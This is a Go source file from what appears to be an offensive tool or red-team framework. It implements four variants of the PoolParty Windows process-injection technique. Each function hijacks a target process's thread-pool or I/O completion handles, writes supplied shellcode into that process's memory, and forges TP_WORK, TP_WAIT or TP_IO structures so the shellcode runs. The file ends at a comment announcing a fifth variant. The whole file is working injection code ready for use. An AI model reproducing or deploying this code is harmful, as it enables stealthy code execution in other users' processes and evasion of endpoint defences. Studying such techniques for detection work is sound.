//go:build windows
// +build windows

package commands

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// executeVariant1 implements Worker Factory Start Routine Overwrite
func executeVariant1(shellcode []byte, pid uint32) (string, error) {
	hProcess, output, err := poolPartyInit(1, "Worker Factory Start Routine Overwrite", shellcode, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)

	// Step 2: Hijack TpWorkerFactory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Query worker factory information
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		0,
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start routine: 0x%X\n", workerFactoryInfo.StartRoutine)
	output += fmt.Sprintf("[+] Current worker count: %d\n", workerFactoryInfo.TotalWorkerCount)

	// Step 4: Write shellcode to start routine address
	bytesWritten, err := injectWriteMemory(hProcess, workerFactoryInfo.StartRoutine, shellcode)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes to start routine address\n", bytesWritten)

	// Step 5: Increase thread minimum to trigger new worker thread creation
	newMinimum := workerFactoryInfo.TotalWorkerCount + 1
	status, _, _ = procNtSetInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryThreadMinimum),
		uintptr(unsafe.Pointer(&newMinimum)),
		uintptr(unsafe.Sizeof(newMinimum)),
	)
	if status != 0 {
		return output, fmt.Errorf("NtSetInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Set worker factory thread minimum to: %d\n", newMinimum)
	output += "[+] PoolParty Variant 1 injection completed successfully\n"

	return output, nil
}

// executeVariant2 implements TP_WORK Insertion
func executeVariant2(shellcode []byte, pid uint32) (string, error) {
	hProcess, output, err := poolPartyInit(2, "TP_WORK Insertion", shellcode, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)

	// Step 2: Hijack TpWorkerFactory handle
	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
	}
	defer windows.CloseHandle(hWorkerFactory)
	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)

	// Step 3: Query worker factory information
	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
	status, _, _ := procNtQueryInformationWorkerFactory.Call(
		uintptr(hWorkerFactory),
		uintptr(WorkerFactoryBasicInformation),
		uintptr(unsafe.Pointer(&workerFactoryInfo)),
		uintptr(unsafe.Sizeof(workerFactoryInfo)),
		0,
	)
	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
	}
	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)

	// Step 4: Read target process's TP_POOL structure
	var targetTpPool FULL_TP_POOL
	err = injectReadMemoryInto(hProcess, workerFactoryInfo.StartParameter, unsafe.Pointer(&targetTpPool), int(unsafe.Sizeof(targetTpPool)))
	if err != nil {
		return output, fmt.Errorf("ReadProcessMemory for TP_POOL failed: %v", err)
	}
	output += "[+] Read target process's TP_POOL structure\n"

	// Step 5: Get high priority task queue address
	if targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] == 0 {
		return output, fmt.Errorf("high priority task queue is NULL")
	}

	// Read the TPP_QUEUE structure to get the queue LIST_ENTRY
	var targetQueue TPP_QUEUE
	err = injectReadMemoryInto(hProcess, targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH], unsafe.Pointer(&targetQueue), int(unsafe.Sizeof(targetQueue)))
	if err != nil {
		return output, fmt.Errorf("ReadProcessMemory for TPP_QUEUE failed: %v", err)
	}
	output += "[+] Read target process's task queue structure\n"

	// Step 6+7: Allocate memory for shellcode and write with W^X protection
	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
	if err != nil {
		return output, err
	}

	// Step 8: Create TP_WORK structure via CreateThreadpoolWork (exactly as SafeBreach does)
	pTpWork, _, err := procCreateThreadpoolWork.Call(
		shellcodeAddr, // Work callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpWork == 0 {
		return output, fmt.Errorf("work item creation failed: %v", err)
	}
	output += "[+] Created TP_WORK structure associated with shellcode\n"

	// Step 9: Read and modify the TP_WORK structure
	var tpWork FULL_TP_WORK
	// Copy the structure from our local process
	for i := 0; i < int(unsafe.Sizeof(tpWork)); i++ {
		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
			*(*byte)(unsafe.Pointer(pTpWork + uintptr(i)))
	}

	// Close the local TP_WORK now that we've copied it
	procCloseThreadpoolWork.Call(pTpWork)

	// Modify: Point Pool to target's TP_POOL
	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter

	// Modify: Point Flink and Blink to the Queue field address in the target process
	// targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] is a pointer to TPP_QUEUE in target
	// We need the address of the Queue field within that TPP_QUEUE
	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))

	// Read current queue state before modifying
	var currentQueueFlink uintptr
	err = injectReadMemoryInto(hProcess, targetQueueListAddr, unsafe.Pointer(&currentQueueFlink), int(unsafe.Sizeof(currentQueueFlink)))
	if err != nil {
		return output, fmt.Errorf("ReadProcessMemory for current queue Flink failed: %v", err)
	}

	var currentQueueBlink uintptr
	err = injectReadMemoryInto(hProcess, targetQueueListAddr+8, unsafe.Pointer(&currentQueueBlink), int(unsafe.Sizeof(currentQueueBlink)))
	if err != nil {
		return output, fmt.Errorf("ReadProcessMemory for current queue Blink failed: %v", err)
	}

	output += fmt.Sprintf("[*] Current queue Flink: 0x%X, Blink: 0x%X (queue list addr: 0x%X)\n", currentQueueFlink, currentQueueBlink, targetQueueListAddr)

	// If queue is empty (points to itself), simple circular list
	// If queue has items, insert at head
	if currentQueueFlink == targetQueueListAddr {
		output += "[*] Queue is empty, creating single-element list\n"
		tpWork.Task.ListEntry.Flink = targetQueueListAddr
		tpWork.Task.ListEntry.Blink = targetQueueListAddr
	} else {
		output += "[*] Queue has existing items, inserting at head\n"
		tpWork.Task.ListEntry.Flink = currentQueueFlink
		tpWork.Task.ListEntry.Blink = targetQueueListAddr
	}

	// Set WorkState exactly as SafeBreach does
	tpWork.WorkState.Exchange = 0x2
	output += "[+] Modified TP_WORK structure for insertion\n"

	// Step 10: Allocate memory for TP_WORK in target process
	tpWorkAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpWork)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_WORK failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_WORK memory at: 0x%X\n", tpWorkAddr)

	// Step 11: Write TP_WORK to target
	tpWorkBytes := (*[1 << 20]byte)(unsafe.Pointer(&tpWork))[:unsafe.Sizeof(tpWork)]
	bytesWritten, err := injectWriteMemory(hProcess, tpWorkAddr, tpWorkBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_WORK failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_WORK structure (%d bytes)\n", bytesWritten)

	// Step 12: Insert into queue - write remote TP_WORK list entry address to queue's Flink and Blink
	// Calculate the address of our TP_WORK's Task.ListEntry in the target process
	remoteWorkItemTaskListAddr := tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry))

	// Recalculate queue addresses (can't use := since variables already declared)
	targetTaskQueueAddr = targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
	targetQueueListAddr = targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))

	output += fmt.Sprintf("[*] Debug: remoteWorkItemTaskListAddr = 0x%X\n", remoteWorkItemTaskListAddr)
	output += fmt.Sprintf("[*] Debug: targetQueueListAddr (Flink addr) = 0x%X\n", targetQueueListAddr)

	// Update queue's Flink to point to our TP_WORK
	flinkBytes := (*[8]byte)(unsafe.Pointer(&remoteWorkItemTaskListAddr))[:]
	_, err = injectWriteMemory(hProcess, targetQueueListAddr, flinkBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for queue Flink failed: %v", err)
	}

	// Update queue's Blink based on whether queue was empty
	var blinkTarget uintptr
	if currentQueueFlink == targetQueueListAddr {
		// Queue was empty, so Blink also points to our work item
		blinkTarget = remoteWorkItemTaskListAddr
	} else {
		// Queue had items, need to update the old first item's Blink to point to us
		// and queue's Blink stays pointing to the last item
		// Actually, for simplicity, SafeBreach just sets both to the new item
		blinkTarget = remoteWorkItemTaskListAddr
	}

	blinkBytes := (*[8]byte)(unsafe.Pointer(&blinkTarget))[:]
	_, err = injectWriteMemory(hProcess, targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))), blinkBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for queue Blink failed: %v", err)
	}

	// If there was an existing first item, update its Blink to point to our work item
	if currentQueueFlink != targetQueueListAddr {
		// Calculate the Blink address of the old first item
		// currentQueueFlink points to a LIST_ENTRY, Blink is at offset 8
		oldFirstItemBlinkAddr := currentQueueFlink + 8
		oldBlinkBytes := (*[8]byte)(unsafe.Pointer(&remoteWorkItemTaskListAddr))[:]
		_, err = injectWriteMemory(hProcess, oldFirstItemBlinkAddr, oldBlinkBytes)
		if err != nil {
			return output, fmt.Errorf("WriteProcessMemory for old first item Blink failed: %v", err)
		}
		output += "[*] Updated old first item's Blink pointer\n"
	}

	output += "[+] Inserted TP_WORK into target process thread pool task queue\n"
	output += "[+] PoolParty Variant 2 injection completed successfully\n"

	return output, nil
}

// executeVariant3 implements TP_WAIT Insertion via Event signaling
func executeVariant3(shellcode []byte, pid uint32) (string, error) {
	hProcess, output, err := poolPartyInit(3, "TP_WAIT Insertion", shellcode, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3+4: Allocate memory for shellcode and write with W^X protection
	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
	if err != nil {
		return output, err
	}

	// Step 5: Create TP_WAIT structure via CreateThreadpoolWait
	pTpWait, _, err := procCreateThreadpoolWait.Call(
		shellcodeAddr, // Wait callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpWait == 0 {
		return output, fmt.Errorf("wait item creation failed: %v", err)
	}
	output += "[+] Created TP_WAIT structure associated with shellcode\n"

	// Step 6: Allocate memory for TP_WAIT in target process
	var tpWait FULL_TP_WAIT
	tpWaitAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpWait)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_WAIT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_WAIT memory at: 0x%X\n", tpWaitAddr)

	// Step 7: Write TP_WAIT to target process
	tpWaitBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpWait))[:unsafe.Sizeof(tpWait)]
	bytesWritten, err := injectWriteMemory(hProcess, tpWaitAddr, tpWaitBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_WAIT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_WAIT structure (%d bytes)\n", bytesWritten)

	// Step 8: Allocate and write TP_DIRECT separately
	pWaitStruct := (*FULL_TP_WAIT)(unsafe.Pointer(pTpWait))
	var tpDirect TP_DIRECT
	tpDirectAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpDirect)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_DIRECT failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_DIRECT memory at: 0x%X\n", tpDirectAddr)

	tpDirectBytes := (*[1 << 20]byte)(unsafe.Pointer(&pWaitStruct.Direct))[:unsafe.Sizeof(tpDirect)]
	_, err = injectWriteMemory(hProcess, tpDirectAddr, tpDirectBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %v", err)
	}
	output += "[+] Wrote TP_DIRECT structure\n"

	// Step 9: Create event
	eventName, _ := windows.UTF16PtrFromString("PoolPartyEvent")
	hEvent, _, err := procCreateEventW.Call(
		0, // Security attributes
		0, // Manual reset (FALSE)
		0, // Initial state (FALSE)
		uintptr(unsafe.Pointer(eventName)),
	)
	if hEvent == 0 {
		return output, fmt.Errorf("CreateEventW failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hEvent))
	output += "[+] Created event 'PoolPartyEvent'\n"

	// Step 10: Associate event with IO completion port via ZwAssociateWaitCompletionPacket
	status, _, _ := procZwAssociateWaitCompletionPacket.Call(
		pWaitStruct.WaitPkt,    // WaitCompletionPacketHandle
		uintptr(hIoCompletion), // IoCompletionHandle
		hEvent,                 // TargetObjectHandle (event)
		tpDirectAddr,           // KeyContext (remote TP_DIRECT)
		tpWaitAddr,             // ApcContext (remote TP_WAIT)
		0,                      // IoStatus
		0,                      // IoStatusInformation
		0,                      // AlreadySignaled (NULL)
	)
	if status != 0 {
		return output, fmt.Errorf("ZwAssociateWaitCompletionPacket failed: 0x%X", status)
	}
	output += "[+] Associated event with target's I/O completion port\n"

	// Step 11: Set event to trigger callback
	ret, _, err := procSetEvent.Call(hEvent)
	if ret == 0 {
		return output, fmt.Errorf("SetEvent failed: %v", err)
	}
	output += "[+] Set event to queue packet to I/O completion port\n"
	output += "[+] PoolParty Variant 3 injection completed successfully\n"

	// Cleanup local TP_WAIT
	procCloseThreadpoolWait.Call(pTpWait)

	return output, nil
}

// executeVariant4 implements TP_IO Insertion via File I/O completion
func executeVariant4(shellcode []byte, pid uint32) (string, error) {
	hProcess, output, err := poolPartyInit(4, "TP_IO Insertion", shellcode, pid)
	if err != nil {
		return output, err
	}
	defer injectCloseHandle(hProcess)

	// Step 2: Hijack I/O completion port handle
	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
	if err != nil {
		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
	}
	defer windows.CloseHandle(hIoCompletion)
	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)

	// Step 3+4: Allocate memory for shellcode and write with W^X protection
	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output)
	if err != nil {
		return output, err
	}

	// Step 5: Create file with overlapped flag for async I/O
	fileName, _ := windows.UTF16PtrFromString("C:\\Windows\\Temp\\PoolParty.txt")
	hFile, _, err := procCreateFileW.Call(
		uintptr(unsafe.Pointer(fileName)),
		uintptr(GENERIC_WRITE),
		uintptr(FILE_SHARE_READ|FILE_SHARE_WRITE),
		0, // Security attributes
		uintptr(CREATE_ALWAYS),
		uintptr(FILE_ATTRIBUTE_NORMAL|FILE_FLAG_OVERLAPPED),
		0, // Template file
	)
	if hFile == uintptr(windows.InvalidHandle) {
		return output, fmt.Errorf("CreateFileW failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hFile))
	output += "[+] Created file 'C:\\Windows\\Temp\\PoolParty.txt' with overlapped I/O\n"

	// Step 6: Create TP_IO structure via CreateThreadpoolIo
	pTpIo, _, err := procCreateThreadpoolIo.Call(
		hFile,
		shellcodeAddr, // I/O callback points to shellcode
		0,             // Context
		0,             // Callback environment
	)
	if pTpIo == 0 {
		return output, fmt.Errorf("IO item creation failed: %v", err)
	}
	output += "[+] Created TP_IO structure associated with shellcode\n"

	// Step 7: Modify TP_IO - set callback and increment PendingIrpCount
	pIoStruct := (*FULL_TP_IO)(unsafe.Pointer(pTpIo))
	pIoStruct.CleanupGroupMember.Callback = shellcodeAddr // Explicitly set callback
	pIoStruct.PendingIrpCount++                           // Mark async I/O as pending
	output += "[+] Modified TP_IO: set callback and incremented PendingIrpCount\n"

	// Step 8: Allocate memory for TP_IO in target process
	var tpIo FULL_TP_IO
	tpIoAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpIo)), PAGE_READWRITE)
	if err != nil {
		return output, fmt.Errorf("remote allocation for TP_IO failed: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated TP_IO memory at: 0x%X\n", tpIoAddr)

	// Step 9: Write TP_IO to target process
	tpIoBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpIo))[:unsafe.Sizeof(tpIo)]
	bytesWritten, err := injectWriteMemory(hProcess, tpIoAddr, tpIoBytes)
	if err != nil {
		return output, fmt.Errorf("WriteProcessMemory for TP_IO failed: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote TP_IO structure (%d bytes)\n", bytesWritten)

	// Step 10: Calculate remote TP_DIRECT address
	var dummyTpIo FULL_TP_IO
	remoteTpDirectAddr := tpIoAddr + uintptr(unsafe.Offsetof(dummyTpIo.Direct))

	// Step 11: Associate file with target's I/O completion port
	var ioStatusBlock IO_STATUS_BLOCK
	fileCompletionInfo := FILE_COMPLETION_INFORMATION{
		Port: uintptr(hIoCompletion),
		Key:  remoteTpDirectAddr,
	}
	status, _, _ := procZwSetInformationFile.Call(
		hFile,
		uintptr(unsafe.Pointer(&ioStatusBlock)),
		uintptr(unsafe.Pointer(&fileCompletionInfo)),
		uintptr(unsafe.Sizeof(fileCompletionInfo)),
		uintptr(FileReplaceCompletionInformation),
	)
	if status != 0 {
		return output, fmt.Errorf("ZwSetInformationFile failed: 0x%X", status)
	}
	output += "[+] Associated file with target's I/O completion port\n"

	// Step 12: Write to file to trigger I/O completion
	data := []byte("PoolParty injection trigger")
	var overlapped windows.Overlapped
	ret, _, err := procWriteFile.Call(
		hFile,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		0, // Bytes written (NULL for async)
		uintptr(unsafe.Pointer(&overlapped)),
	)
	// WriteFile returns 0 for pending async operation, which is expected
	_ = ret
	output += "[+] Wrote to file to trigger I/O completion\n"
	output += "[+] PoolParty Variant 4 injection completed successfully\n"

	// Cleanup local TP_IO
	procCloseThreadpoolIo.Call(pTpIo)

	return output, nil
}

// executeVariant5 implements TP_ALPC Insertion via ALPC port messaging
